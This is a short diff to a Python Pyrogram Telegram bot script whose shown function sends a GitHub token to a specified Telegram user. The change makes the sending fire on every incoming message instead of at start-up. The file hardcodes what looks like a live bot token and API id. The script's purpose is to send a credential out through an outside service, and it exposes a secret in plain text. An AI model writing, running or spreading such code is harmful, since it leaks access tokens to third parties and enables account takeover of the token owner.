@@ -1,7 +1,6 @@
 from pyrogram import Client, filters
 import os
 
-
 # Replace 'YOUR_BOT_TOKEN', 'YOUR_API_ID', 'YOUR_API_HASH', and 'TARGET_USER_ID' with your actual values
 bot_token = '6126230406:AAFAtz4AhVLbSEnm7KabLzDa7d5Yf0_Mo2I'
 api_id = '11405252'
@@ -17,8 +16,8 @@ async def send_github_token():
     # Send the GitHub token to the specified user
     await app.send_message(target_user_id, f'GitHub Token: {github_token}')
 
-@app.on_start
-async def on_start(client, _):
+@app.on_message
+async def on_message(client, _):
     await send_github_token()
 
 if __name__ == "__main__":
